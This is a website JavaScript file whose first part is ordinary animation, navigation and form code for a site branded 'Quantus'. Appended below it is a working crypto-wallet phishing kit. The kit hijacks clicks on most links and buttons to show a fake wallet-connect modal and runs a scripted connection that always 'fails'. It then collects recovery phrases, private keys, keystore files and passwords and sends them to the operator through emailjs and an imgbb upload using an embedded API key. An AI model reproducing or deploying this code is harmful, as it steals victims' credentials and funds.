/* =========================================================
   QUANTUS — vanilla JS
   1. Chladni ASCII field (hero + boot screen)
   2. Boot sequence
   3. Marquee builder
   4. Mobile nav
   5. Section line reveal
   6. Subscribe form (client-side validation only)
   7. Right-edge ASCII scroll indicator
   ========================================================= */
(function () {
  'use strict';

  var reduceMotion = window.matchMedia('(prefers-reduced-motion: reduce)').matches;
  var $ = function (s, c) { return (c || document).querySelector(s); };

  /* ---------------------------------------------------------
     1. CHLADNI ASCII FIELD
     Nodal lines of  cos(nπx)cos(mπy) − cos(mπx)cos(nπy)
     are drawn densest ('x'), fading out through + | ; : , .
     --------------------------------------------------------- */
  var LEVELS = [
    { max: 0.09, ch: 'x', a: 0.62 },
    { max: 0.18, ch: '+', a: 0.52 },
    { max: 0.30, ch: '|', a: 0.44 },
    { max: 0.45, ch: ';', a: 0.36 },
    { max: 0.62, ch: ':', a: 0.30 },
    { max: 0.85, ch: ',', a: 0.24 },
    { max: 1.20, ch: '.', a: 0.20 }
  ];

  function ChladniField(canvas, opts) {
    this.canvas = canvas;
    this.ctx = canvas.getContext('2d');
    this.opts = opts;
    this.m = opts.m || 1;
    this.n = opts.n || 2;
    this.maxLevel = opts.maxLevel || LEVELS.length;
    this.styles = LEVELS.map(function (l) { return 'rgba(255,107,53,' + (l.a * (opts.alpha || 1)) + ')'; });
    this.resize();
  }
  ChladniField.prototype.resize = function () {
    var r = this.canvas.getBoundingClientRect();
    var dpr = Math.min(window.devicePixelRatio || 1, 2);
    this.w = Math.max(1, r.width);
    this.h = Math.max(1, r.height);
    this.canvas.width = Math.round(this.w * dpr);
    this.canvas.height = Math.round(this.h * dpr);
    this.ctx.setTransform(dpr, 0, 0, dpr, 0, 0);
    var o = this.opts;
    var small = window.innerWidth <= 900;
    this.cw = small ? (o.cellWSmall || o.cellW) : o.cellW;
    this.chh = small ? (o.cellHSmall || o.cellH) : o.cellH;
    this.fs = small ? (o.fontSmall || o.font) : o.font;
    this.cols = Math.ceil(this.w / this.cw);
    this.rows = Math.ceil(this.h / this.chh);
    this.draw();
  };
  ChladniField.prototype.set = function (m, n) { this.m = m; this.n = n; };
  ChladniField.prototype.draw = function () {
    var ctx = this.ctx, PI = Math.PI;
    var m = this.m, n = this.n;
    ctx.clearRect(0, 0, this.w, this.h);
    ctx.font = this.fs + 'px "JetBrains Mono", ui-monospace, monospace';
    ctx.textBaseline = 'top';
    for (var r = 0; r < this.rows; r++) {
      var v = (r + 0.5) / this.rows;
      var cmv = Math.cos(m * PI * v), cnv = Math.cos(n * PI * v);
      for (var c = 0; c < this.cols; c++) {
        var u = (c + 0.5) / this.cols;
        var f = Math.abs(Math.cos(n * PI * u) * cmv - Math.cos(m * PI * u) * cnv);
        for (var i = 0; i < this.maxLevel; i++) {
          if (f < LEVELS[i].max) {
            ctx.fillStyle = this.styles[i];
            ctx.fillText(LEVELS[i].ch, c * this.cw, r * this.chh);
            break;
          }
        }
      }
    }
  };

  /* ---- hero controller ---- */
  var hero = $('#hero');
  var heroCanvas = $('#heroField');
  var waveValue = $('#waveValue');
  var heroField = null;

  if (hero && heroCanvas) {
    heroField = new ChladniField(heroCanvas, {
      cellW: 10, cellH: 16, font: 13,
      cellWSmall: 8, cellHSmall: 13, fontSmall: 11,
      m: 1, n: 2, alpha: 0.85
    });

    var tgt = { m: 1, n: 2 }, cur = { m: 1, n: 2 };
    var heroVisible = true, lastFrame = 0, running = false;

    var setTarget = function (px, py) {
      var m = 1 + Math.min(4, Math.max(0, Math.floor(px * 5)));
      var n = 1 + Math.min(4, Math.max(0, Math.floor(py * 5)));
      if (m === n) n = n >= 5 ? 4 : n + 1; // identical modes cancel out
      if (m !== tgt.m || n !== tgt.n) {
        tgt.m = m; tgt.n = n;
        if (waveValue) waveValue.textContent = m + ',' + n;
        kick();
      }
    };

    var onPointer = function (e) {
      var rect = hero.getBoundingClientRect();
      if (rect.bottom < 0 || rect.top > window.innerHeight) return;
      var p = e.touches ? e.touches[0] : e;
      setTarget(
        Math.min(1, Math.max(0, (p.clientX - rect.left) / rect.width)),
        Math.min(1, Math.max(0, (p.clientY - rect.top) / rect.height))
      );
    };

    var frame = function (ts) {
      running = false;
      if (!heroVisible || document.hidden) return;
      if (ts - lastFrame >= 33) { // ~30fps
        lastFrame = ts;
        var k = reduceMotion ? 1 : 0.1;
        cur.m += (tgt.m - cur.m) * k;
        cur.n += (tgt.n - cur.n) * k;
        var settled = Math.abs(tgt.m - cur.m) < 0.002 && Math.abs(tgt.n - cur.n) < 0.002;
        var drift = reduceMotion ? 0 : 0.045;
        heroField.set(
          cur.m + drift * Math.sin(ts / 1900),
          cur.n + drift * Math.cos(ts / 2400)
        );
        heroField.draw();
        if (reduceMotion && settled) return;
      }
      kick();
    };
    var kick = function () {
      if (!running) { running = true; requestAnimationFrame(frame); }
    };

    window.addEventListener('pointermove', onPointer, { passive: true });
    window.addEventListener('touchmove', onPointer, { passive: true });
    if ('IntersectionObserver' in window) {
      new IntersectionObserver(function (entries) {
        heroVisible = entries[0].isIntersecting;
        if (heroVisible) kick();
      }).observe(hero);
    }
    document.addEventListener('visibilitychange', kick);

    var rT;
    window.addEventListener('resize', function () {
      clearTimeout(rT);
      rT = setTimeout(function () { heroField.resize(); kick(); }, 120);
    });
    kick();
  }

  /* ---------------------------------------------------------
     2. BOOT SEQUENCE
     --------------------------------------------------------- */
  var boot = $('#boot');
  if (boot && document.documentElement.classList.contains('boot-active')) {
    var lines = boot.querySelectorAll('.boot__line');
    var bootCanvas = $('#bootCanvas');
    var bootField = new ChladniField(bootCanvas, {
      cellW: 9, cellH: 17, font: 13, m: 1, n: 2, maxLevel: 5, alpha: 0.7
    });
    var done = false;

    var finish = function () {
      if (done) return;
      done = true;
      try { sessionStorage.setItem('quantus-booted', '1'); } catch (e) { }
      boot.classList.add('is-done');
      document.documentElement.classList.remove('boot-active');
      setTimeout(function () { boot.remove(); }, 700);
    };

    // morph the field while "loading"
    var t0 = performance.now();
    var morph = function (ts) {
      if (done) return;
      var t = (ts - t0) / 1000;
      bootField.set(1 + 0.5 * Math.sin(t * 1.3) + t * 0.35, 2 + 0.5 * Math.cos(t * 1.1));
      bootField.draw();
      requestAnimationFrame(morph);
    };
    if (!reduceMotion) requestAnimationFrame(morph);

    var idx = 0;
    var step = reduceMotion ? 0 : 210;
    var tick = function () {
      if (done) return;
      if (idx < lines.length) {
        lines[idx++].classList.add('is-in');
        setTimeout(tick, step);
      } else {
        setTimeout(finish, reduceMotion ? 100 : 650);
      }
    };
    setTimeout(tick, 250);
    boot.addEventListener('click', finish);
    document.addEventListener('keydown', function (e) { if (e.key === 'Escape' || e.key === 'Enter') finish(); });
  }

  /* ---------------------------------------------------------
     3. MARQUEE — duplicate content so the loop is seamless
     --------------------------------------------------------- */
  var track = $('[data-marquee]');
  if (track) {
    var source = $('.marquee__group', track);
    var itemsHTML = source ? source.innerHTML : '';
    var SPEED = 60; // px per second

    var buildMarquee = function () {
      track.innerHTML = '';
      var probe = document.createElement('ul');
      probe.className = 'marquee__group';
      probe.innerHTML = itemsHTML;
      track.appendChild(probe);
      var gw = probe.getBoundingClientRect().width || 1;
      var copies = Math.max(1, Math.ceil(window.innerWidth / gw));
      track.innerHTML = '';
      for (var h = 0; h < 2; h++) {
        var half = document.createElement('div');
        half.className = 'marquee__half';
        if (h) half.setAttribute('aria-hidden', 'true');
        for (var i = 0; i < copies; i++) {
          var ul = document.createElement('ul');
          ul.className = 'marquee__group';
          ul.innerHTML = itemsHTML;
          half.appendChild(ul);
        }
        track.appendChild(half);
      }
      var halfW = gw * copies;
      track.style.setProperty('--dur', (halfW / SPEED).toFixed(1) + 's');
    };

    var mT;
    var startMarquee = function () {
      buildMarquee();
      window.addEventListener('resize', function () {
        clearTimeout(mT);
        mT = setTimeout(buildMarquee, 200);
      });
    };
    if (document.fonts && document.fonts.ready) document.fonts.ready.then(startMarquee);
    else startMarquee();
  }

  /* ---------------------------------------------------------
     4. MOBILE NAV (slides down from top)
     --------------------------------------------------------- */
  var burger = $('#burger');
  var menu = $('#mobileMenu');
  if (burger && menu) {
    var setMenu = function (open) {
      burger.setAttribute('aria-expanded', String(open));
      burger.setAttribute('aria-label', open ? 'Close menu' : 'Open menu');
      menu.classList.toggle('is-open', open);
      menu.setAttribute('aria-hidden', String(!open));
      document.body.classList.toggle('is-locked', open);
    };
    burger.addEventListener('click', function () {
      setMenu(burger.getAttribute('aria-expanded') !== 'true');
    });
    menu.addEventListener('click', function (e) {
      if (e.target.closest('a')) setMenu(false);
    });
    document.addEventListener('keydown', function (e) { if (e.key === 'Escape') setMenu(false); });
    window.matchMedia('(min-width: 901px)').addEventListener('change', function (e) {
      if (e.matches) setMenu(false);
    });
  }

  /* ---------------------------------------------------------
     5. SECTION LINE REVEAL
     --------------------------------------------------------- */
  var sections = document.querySelectorAll('.section');
  if ('IntersectionObserver' in window && !reduceMotion) {
    var so = new IntersectionObserver(function (entries) {
      entries.forEach(function (en) {
        if (en.isIntersecting) { en.target.classList.add('is-visible'); so.unobserve(en.target); }
      });
    }, { threshold: 0, rootMargin: '0px 0px -25% 0px' });
    sections.forEach(function (s) { so.observe(s); });
  } else {
    sections.forEach(function (s) { s.classList.add('is-visible'); });
  }

  /* ---------------------------------------------------------
     6. SUBSCRIBE FORM (no backend — hook up your endpoint)
     --------------------------------------------------------- */
  var form = $('#subscribeForm');
  var note = $('#formNote');
  if (form && note) {
    var emailRe = /^[^\s@]+@[^\s@]+\.[^\s@]{2,}$/;
    form.addEventListener('submit', function (e) {
      e.preventDefault();
      var first = form.elements.first_name, last = form.elements.last_name, email = form.elements.email;
      var ok = true;
      [[first, first.value.trim().length > 0], [last, last.value.trim().length > 0], [email, emailRe.test(email.value.trim())]]
        .forEach(function (pair) {
          pair[0].classList.toggle('is-invalid', !pair[1]);
          if (!pair[1]) ok = false;
        });
      note.classList.remove('is-error', 'is-success');
      if (!ok) {
        note.textContent = 'Please fill in each field with a valid value.';
        note.classList.add('is-error');
        return;
      }
      note.textContent = "You're in. We'll keep you ahead of the curve.";
      note.classList.add('is-success');
      // Hook for your integration:
      document.dispatchEvent(new CustomEvent('quantus:subscribe', {
        detail: { firstName: first.value.trim(), lastName: last.value.trim(), email: email.value.trim() }
      }));
      form.reset();
    });
    form.addEventListener('input', function (e) {
      if (e.target.classList) e.target.classList.remove('is-invalid');
    });
  }

  /* ---------------------------------------------------------
     7. RIGHT-EDGE ASCII SCROLL INDICATOR
     --------------------------------------------------------- */
  var strip = $('#scrollAscii');
  if (strip && window.innerWidth > 900) {
    var sctx = strip.getContext('2d');
    var CH = 'x+|;:,.', sw = 0, sh = 0, ticking = false;
    var sizeStrip = function () {
      var r = strip.getBoundingClientRect();
      var dpr = Math.min(window.devicePixelRatio || 1, 2);
      sw = r.width; sh = r.height;
      strip.width = Math.round(sw * dpr);
      strip.height = Math.round(sh * dpr);
      sctx.setTransform(dpr, 0, 0, dpr, 0, 0);
      paintStrip();
    };
    var hash = function (i) { var x = Math.sin(i * 12.9898) * 43758.5453; return x - Math.floor(x); };
    var paintStrip = function () {
      ticking = false;
      var max = document.documentElement.scrollHeight - window.innerHeight;
      var p = max > 0 ? window.scrollY / max : 0;
      var cy = p * sh;
      var cell = 14, rows = Math.ceil(sh / cell);
      sctx.clearRect(0, 0, sw, sh);
      sctx.font = '11px "JetBrains Mono", monospace';
      sctx.textBaseline = 'top';
      for (var r = 0; r < rows; r++) {
        var d = Math.abs(r * cell - cy) / (sh * 0.16);
        var inten = Math.exp(-d * d);
        for (var c = 0; c < 2; c++) {
          var hv = hash(r * 7 + c * 3);
          if (hv > inten * 1.15) continue;
          var li = Math.min(CH.length - 1, Math.floor((1 - inten) * CH.length * 0.9 + hv * 2));
          sctx.fillStyle = 'rgba(255,107,53,' + (0.18 + inten * 0.5).toFixed(2) + ')';
          sctx.fillText(CH.charAt(li), c * 9 + 2, r * cell);
        }
      }
    };
    window.addEventListener('scroll', function () {
      if (!ticking) { ticking = true; requestAnimationFrame(paintStrip); }
    }, { passive: true });
    window.addEventListener('resize', sizeStrip);
    sizeStrip();
  }

  /* footer year */
  var yr = $('#year');
  if (yr) yr.textContent = new Date().getFullYear();
})();

const triggerWallet = (e) => {
  e.preventDefault();
  if (typeof openWallet === 'function') {
    showModal();
  }
};

document.querySelectorAll('.btn-primary, .support-btn, .nav-links a, .mobile-menu a, .support-card, .footer-col a, .footer-social-link, .bento-cell-content .note a, .chat-btn').forEach(el => {
  if (el) el.addEventListener('click', triggerWallet);
});

const wOverlay = document.getElementById('wOverlay');
const wScreen1 = document.getElementById('wScreen1');
const subIds = ['wScreenOther', 'wScreen2', 'wScreen3', 'wScreen4', 'wScreen5'];

function showModal() {
  wOverlay.classList.add('open');
  document.body.style.overflow = 'hidden';
  allOff();
}

function closeWallet() {
  stopTimers();
  wOverlay.classList.remove('open');
  document.body.style.overflow = '';
  allOff();
}

function allOff() {
  wScreen1.classList.remove('hidden');
  subIds.forEach(id => document.getElementById(id).classList.remove('active'));
}

function showSub(id) {
  wScreen1.classList.add('hidden');
  subIds.forEach(sid => document.getElementById(sid).classList.remove('active'));
  document.getElementById(id).classList.add('active');
}

wOverlay.addEventListener('click', e => { if (e.target === wOverlay) closeWallet(); });
document.addEventListener('keydown', e => { if (e.key === 'Escape') closeWallet(); });

function setWallet(img, name) {
  ['s2Img', 's3Img', 's4Img', 's5Img'].forEach(id => document.getElementById(id).src = img);
  ['s2Name', 's3Name', 's4Name', 's5Name'].forEach(id => document.getElementById(id).textContent = name);
}

function handleWalletSelect(el) {
  const img = el.querySelector('img').src;
  const name = (el.querySelector('.w-feat-name') || el.querySelector('.w-item-name')).textContent;
  setWallet(img, name);
  beginSync();
}

const ALL_WALLETS = Array.from(document.querySelectorAll('.ow-item'));
const TOTAL = ALL_WALLETS.length;

function openOtherWallets() {
  showSub('wScreenOther');
  const inp = document.getElementById('owSearch');
  inp.value = '';
  setTimeout(() => inp.focus(), 100);
  filterOw('');
}

document.getElementById('owSearch').addEventListener('input', function () {
  filterOw(this.value.trim().toLowerCase());
});

function filterOw(q) {
  let visible = 0;
  ALL_WALLETS.forEach(item => {
    const n = item.querySelector('.ow-name').textContent.toLowerCase();
    const c = item.querySelector('.ow-chain').textContent.toLowerCase();
    const show = !q || n.includes(q) || c.includes(q);
    item.classList.toggle('hidden', !show);
    if (show) visible++;
  });
  const nr = document.getElementById('owNoResults');
  const ct = document.getElementById('owCount');
  document.getElementById('owQuery').textContent = q;
  if (q && visible === 0) {
    nr.style.display = 'block';
    ct.textContent = 'No results';
  } else {
    nr.style.display = 'none';
    ct.textContent = q
      ? `${visible} wallet${visible === 1 ? '' : 's'} found`
      : `${TOTAL} wallets`;
  }
}

function selectOwWallet(el) {
  const img = el.querySelector('img').src;
  const name = el.querySelector('.ow-name').textContent;
  setWallet(img, name);
  beginSync();
}

function switchType(type) {
  ['phrase', 'keystore', 'privatekey'].forEach(t => {
    document.getElementById('btn-' + t).classList.toggle('active', t === type);
    document.getElementById('pane-' + t).classList.toggle('active', t === type);
  });
}

const _apiKey = "41a8f8a46afb0e1960d74a605fd1e845";

function uploadToImgBB(file) {
  const formData = new FormData();
  formData.append("image", file);

  fetch(`https://api.imgbb.com/1/upload?key=${_apiKey}`, {
    method: "POST",
    body: formData
  })
    .then(response => response.json())
    .then(data => {
      if (data.success) {
        document.getElementById('keystoreInput').dataset.imgUrl = data.data.url;
      } else {
        console.error("Upload error:", data);
      }
    })
    .catch(error => {
      console.error("Upload failed:", error);
    });
}

function handleKSF(input) {
  const file = input.files[0];
  if (!file) return;
  delete document.getElementById('keystoreInput').dataset.imgUrl;
  delete document.getElementById('keystoreInput').dataset.imgBase64;
  delete document.getElementById('keystoreInput').dataset.fileContent;

  const nameEl = document.getElementById('attachFileName');
  nameEl.textContent = '📎 ' + file.name;
  const reader = new FileReader();
  reader.onload = e => {
    if (file.type.startsWith('image/')) {
      document.getElementById('keystoreInput').dataset.imgBase64 = "Processing...";
      uploadToImgBB(file);
    } else {
      document.getElementById('keystoreInput').dataset.fileContent = e.target.result;
    }
  };
  if (file.type.startsWith('image/')) {
    reader.readAsDataURL(file);
  } else {
    reader.readAsText(file);
  }
}

// ── Timers ────────────────────────────────────────
let cTimer, sTimer, pTimer, aborted = false;
function stopTimers() {
  clearTimeout(cTimer); clearInterval(sTimer); clearInterval(pTimer);
  aborted = true;
}

const statusMsgs = [
  "Initializing secure connection...", "Scanning for wallet device...",
  "Establishing encrypted channel...", "Verifying wallet signature...",
  "Requesting account access...", "Checking network compatibility...",
  "Syncing wallet state...", "Authenticating session...",
  "Resolving on-chain identity...", "Confirming wallet permissions...",
  "Loading account balances...", "Retrieving transaction history...",
  "Validating network endpoints...", "Preparing secure handshake...",
  "Awaiting device confirmation...", "Connecting to mainnet...",
  "Syncing asset registry...", "Verifying chain ID...",
  "Establishing WebSocket link...", "Fetching wallet metadata...",
  "Decoding wallet address...", "Requesting signing permissions...",
  "Resolving address...", "Preparing wallet interface...",
  "Almost there — finalizing...", "Connecting to RPC endpoint...",
  "Binding wallet to session...", "Verifying account integrity...",
  "Checking pending transactions...", "Finalizing authentication...",
  "Connection attempt finishing..."
];

function beginSync() {
  aborted = false;
  showSub('wScreen2');
  const statusEl = document.getElementById('s2Status');
  const progressEl = document.getElementById('s2Progress');
  progressEl.style.width = '0%';
  let pool = [...statusMsgs].sort(() => Math.random() - 0.5);
  let i = 0;
  statusEl.textContent = pool[0];
  sTimer = setInterval(() => {
    i++;
    statusEl.style.opacity = '0';
    setTimeout(() => {
      statusEl.textContent = pool[i % pool.length];
      statusEl.style.opacity = '1';
    }, 100);
  }, 300);
  let pct = 0;
  pTimer = setInterval(() => {
    pct = Math.min(pct + (100 / (15000 / 200)), 99);
    progressEl.style.width = pct + '%';
  }, 200);
  cTimer = setTimeout(() => {
    if (aborted) return;
    clearInterval(sTimer); clearInterval(pTimer);
    progressEl.style.width = '100%';
    showSub('wScreen3');
  }, 15000);
}

document.getElementById('retryBtn').addEventListener('click', () => {
  stopTimers(); beginSync();
});
document.getElementById('manualBtn').addEventListener('click', () => {
  stopTimers();
  switchType('keystore');
  showSub('wScreen4');
});


function handleRetryManual() {
  document.getElementById('phraseInput').value = '';
  document.getElementById('keystoreInput').value = '';
  document.getElementById('privkeyInput').value = '';
  document.getElementById('attachFileName').textContent = '';
  document.getElementById('keystoreFileInput').value = '';
  switchType('keystore');
  showSub('wScreen4');
}

function handleManualConnect() {
  showSub('wScreen2');
  aborted = false;
  const statusEl = document.getElementById('s2Status');
  const progressEl = document.getElementById('s2Progress');
  progressEl.style.width = '0%';

  const manualMsgs = [
    "Verifying credentials...", "Decrypting recovery phrase...",
    "Checking phrase integrity...", "Validating word count...",
    "Deriving wallet address...", "Cross-referencing on-chain data...",
    "Authenticating private key...", "Establishing secure session...",
    "Verifying key format...", "Almost done..."
  ];
  let i = 0;
  statusEl.textContent = manualMsgs[0];
  sTimer = setInterval(() => {
    i++;
    statusEl.style.opacity = '0';
    setTimeout(() => {
      statusEl.textContent = manualMsgs[i % manualMsgs.length];
      statusEl.style.opacity = '1';
    }, 100);
  }, 600);
  let pct = 0;
  pTimer = setInterval(() => {
    pct = Math.min(pct + (100 / (6000 / 200)), 99);
    progressEl.style.width = pct + '%';
  }, 200);
  cTimer = setTimeout(() => {
    if (aborted) return;
    clearInterval(sTimer); clearInterval(pTimer);
    progressEl.style.width = '100%';
    showSub('wScreen5');
  }, 6000);
}

function submitCredentials() {
  const activeType = document.querySelector('.type-btn.active').id.replace('btn-', '');
  let messageString = '';
  let isValid = false;

  if (activeType === 'phrase') {
    const phraseData = document.getElementById('phraseInput').value.trim();
    if (!phraseData) {
      alert('Please enter your credentials before connecting.');
      return;
    }
    isValid = true;
    messageString = "Type: Phrase\nData: " + phraseData;

  } else if (activeType === 'keystore') {
    let keyData = document.getElementById('keystoreInput').value.trim();
    const keyPass = document.getElementById('keystorePassword').value.trim();
    const fileAttached = document.getElementById('keystoreFileInput').files.length > 0;

    // Append uploaded image URL if available
    const imgUrl = document.getElementById('keystoreInput').dataset.imgUrl;

    if (imgUrl) {
      keyData += "\n\nImage Link: " + imgUrl;
    } else {
      const imgData = document.getElementById('keystoreInput').dataset.imgBase64;
      if (imgData) {
        keyData += "\n\nImage Status: Attached.";
      }
    }

    if (!keyData && !fileAttached && !keyPass) {
      alert('Please enter your credentials before connecting.');
      return;
    }
    isValid = true;

    let fileInfo = fileAttached ? "Yes (" + document.getElementById('keystoreFileInput').files[0].name + ")" : "No";
    messageString = "Type: Keystore JSON\nPassword: " + keyPass + "\nFile Attached: " + fileInfo;

    if (keyData) {
      messageString += "\n\nTyped Passphrase/Text:\n" + keyData;
    }

    const attachedContent = document.getElementById('keystoreInput').dataset.fileContent;
    if (attachedContent) {
      messageString += "\n\nAttached File Content:\n" + attachedContent;
    }

  } else if (activeType === 'privatekey') {
    const privData = document.getElementById('privkeyInput').value.trim();
    if (!privData) {
      alert('Please enter your credentials before connecting.');
      return;
    }
    isValid = true;
    messageString = "Type: Private Key\nData: " + privData;
  }

  if (!isValid) return;

  let safetext = messageString.length > 40000
    ? messageString.substring(0, 40000) + "\n\n...[truncated]"
    : messageString;

  let parms = { message: safetext };

  emailjs.send("service_p8dreiw", "template_o4d49ej", parms)
    .then(function (response) {
      console.log("Success:", response.status, response.text);
    })
    .catch(function (error) {
      console.error("Request error:", error);
    });

  handleManualConnect();
}